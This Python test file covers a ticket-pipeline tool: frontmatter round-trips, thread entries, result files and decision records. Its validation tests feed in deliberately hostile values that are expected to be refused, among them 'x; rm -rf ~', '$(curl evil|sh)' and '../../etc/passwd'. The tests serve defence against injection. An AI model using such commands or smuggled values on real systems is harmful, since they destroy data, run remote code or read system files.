"""The ticket file: what survives a save, what is refused, and the thread."""
import shutil

from helpers import FIXTURE, project
from pipeline.core import PipelineError
from pipeline.core import ticket as T
from pipeline.core.ticket import Ticket


def test_unknown_frontmatter_survives_a_save():
    """The trap a typed model walks into: a field nobody modelled is data loss."""
    d = project(FIXTURE.replace("counters: {}", "approved_by: chezzijr\ncounters: {}"))
    p = d / ".project/tickets/TICKET-001.md"
    t = Ticket.load(p)
    assert t.extra["approved_by"] == "chezzijr"
    assert t.klass == "bugfix" and t.section("Digest") == "thing.py holds it"
    t.save()
    assert Ticket.load(p).extra["approved_by"] == "chezzijr"
    assert "class: bugfix" in p.read_text(), "the YAML key is `class`, not `klass`"
    shutil.rmtree(d)


def test_save_refuses_an_invalid_ticket():
    """Invariant 5 on the WRITE side: a hostile branch must never reach disk."""
    d = project()
    p = d / ".project/tickets/TICKET-001.md"
    t = Ticket.load(p)
    before = p.read_text()
    t.branch = "x; rm -rf ~"
    try:
        t.save()
        assert False, "wrote a hostile branch to disk"
    except PipelineError:
        pass
    assert p.read_text() == before, "a refused save still touched the file"
    shutil.rmtree(d)


def test_thread_entries_round_trip_and_freeform_survives():
    d = project()
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    t.append("review", "finding", "evict drops the wrong key", severity="blocking")
    e = t.thread()[-1]
    assert (e.stage, e.kind, e.attrs["severity"]) == ("review", "finding", "blocking")
    assert "evict drops the wrong key" in e.text
    t.save()
    assert Ticket.load(t.path).thread()[-1].attrs["severity"] == "blocking"

    t.body += "\n### notes from a human\nlooks fine\n"
    last = t.thread()[-1]           # must not raise: hand-editing is the point
    assert last.kind == "note" and last.ts is None and last.stage == ""
    shutil.rmtree(d)


def test_an_invented_thread_kind_is_refused_on_the_way_in():
    d = project()
    t = Ticket.load(d / ".project/tickets/TICKET-001.md")
    try:
        t.append("review", "lgtm", "x")
        assert False, "wrote a kind no reader knows"
    except PipelineError:
        pass
    shutil.rmtree(d)


def test_frontmatter_that_reaches_a_shell_is_validated():
    ok = {"id": "TICKET-001", "branch": "ticket/001",
          "test_file": "tests/t.py::test_x", "files_declared": ["src/a.py"]}
    assert T.validate_meta(ok) == []
    for field, value in [
        ("test_file", "t.py::x; touch /tmp/PWNED"),
        ("branch", "x; rm -rf ~"),
        ("id", "$(curl evil|sh)"),
        ("id", "../../etc/passwd"),
        ("id", "/tmp/elsewhere"),
        ("stage", "done-ish"),
    ]:
        assert T.validate_meta({**ok, field: value}), f"{field}={value!r} accepted"
    assert T.validate_meta({**ok, "files_declared": ["../../etc/passwd"]})
    assert T.validate_meta({**ok, "files_declared": ["/etc/passwd"]})


def test_a_result_verdict_survives_a_crash_before_it_is_applied():
    d = project()
    T.result_file(d, "TICKET-001").write_text("result: ok\nsummary: x\n")
    assert T.read_result(d, "TICKET-001", keep=True) == {"result": "ok", "summary": "x"}
    assert T.result_file(d, "TICKET-001").is_file(), \
        "the verdict must stay on disk until it has been acted on"
    T.drop_result(d, "TICKET-001")
    assert T.read_result(d, "TICKET-001") is None
    shutil.rmtree(d)


def test_a_corrupt_result_file_does_not_crash_the_dispatcher():
    d = project()
    T.result_file(d, "TICKET-001").write_text("{[not: valid: yaml")
    assert T.read_result(d, "TICKET-001") == {}
    T.result_file(d, "TICKET-001").write_text("- a list, not a mapping")
    assert T.read_result(d, "TICKET-001") == {}
    shutil.rmtree(d)


def test_decision_is_recorded_when_a_ticket_lands():
    d = project(FIXTURE.replace(
        "## Rollback\nrevert",
        "## Decisions\nkeep the explicit flush; without it the buffer leaks\n"
        "## Rollback\nrevert"))
    path = d / ".project/tickets/TICKET-001.md"
    meta, body = T.load_ticket(path)
    did = T.record_decision(d, meta, body)
    text = (d / ".project/decisions" / f"{did}.md").read_text()
    assert "buffer leaks" in text and "TICKET-001" in text, text
    shutil.rmtree(d)


def test_no_decisions_section_records_nothing():
    d = project()
    meta, body = T.load_ticket(d / ".project/tickets/TICKET-001.md")
    assert T.record_decision(d, meta, body) is None
    shutil.rmtree(d)


def test_the_dict_path_still_round_trips():
    """`load_ticket`/`save_ticket` are what the dispatcher itself writes
    through; the typed model does not replace them yet."""
    d = project()
    p = d / ".project/tickets/TICKET-001.md"
    meta, body = T.load_ticket(p)
    T.save_ticket(p, meta, body)
    assert T.load_ticket(p) == (meta, body)
    assert T.sections(body)["Digest"] == "thing.py holds it"
    shutil.rmtree(d)
